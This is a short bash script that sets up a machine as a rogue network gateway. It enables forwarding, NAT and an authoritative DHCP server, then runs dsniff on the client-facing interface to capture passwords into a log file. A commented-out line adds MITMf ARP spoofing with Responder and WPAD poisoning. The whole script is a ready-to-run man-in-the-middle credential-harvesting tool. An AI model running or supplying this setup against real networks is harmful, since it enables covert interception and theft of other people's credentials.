#!/bin/bash

# contributors: cr0d, mel, kd 

[ $1 ] && [ $2 ] || { echo "Usage: $0 <intranet_interface> <internet_interface>"; exit; }

INTRANTE_IFACE=$1 
INTERNET_IFACE=$2

echo 1 > /proc/sys/net/ipv4/ip_forward


reset_iptables(){
    iptables --flush
    iptables --table nat --flush
    iptables --delete-chain
    iptables --table nat --delete-chain
}

config_intranet(){
    ifconfig $INTRANTE_IFACE up
    ifconfig $INTRANTE_IFACE 192.168.1.1 netmask 255.255.255.0
    #ifconfig enp1s0 mtu 1400
    #route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
}

setup_iptables(){
    iptables -F
    iptables -t nat -F
    iptables -A FORWARD -s 192.168.1.0/24 -j ACCEPT
    iptables -t nat -A POSTROUTING -s 192.168.1.0/24 -o $INTERNET_IFACE -j MASQUERADE
}

setup_dhcp(){
sed 's/^//' <<CHAR_EOF > /etc/dhcp/dhcpd.conf
authoritative;
default-lease-time 600;
max-lease-time 7200;

subnet 192.168.1.0 netmask 255.255.255.0 {
option routers 192.168.1.1;
option subnet-mask 255.255.255.0;
option domain-name-servers 8.8.8.8, 8.8.4.4;
range 192.168.1.2 192.168.1.25;
}
CHAR_EOF
echo "INTERFACES=\"$INTRANTE_IFACE\";" >> /etc/dhcp/dhcpd.conf

}

start_dhcp(){
    #dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0
    service isc-dhcp-server start
}

    
echo -n "[INFO] setuping dchp... "
setup_dhcp
echo "Done"

echo -n "[INFO] Starting dhcp... "
start_dhcp
echo "Done"

echo -n "[INFO] Setting up iptables rules... "
setup_iptables
echo "Done"

#xterm -hold -e python3 MITMf/mitmf.py -i $INTERNET_IFACE --spoof --arp --gateway 192.168.1.0 --responder --wpad &
xterm -e dsniff -m -i $INTRANTE_IFACE -d -s 4096 -w dsniff$(date +%F-%H%M).log &> /dev/null &

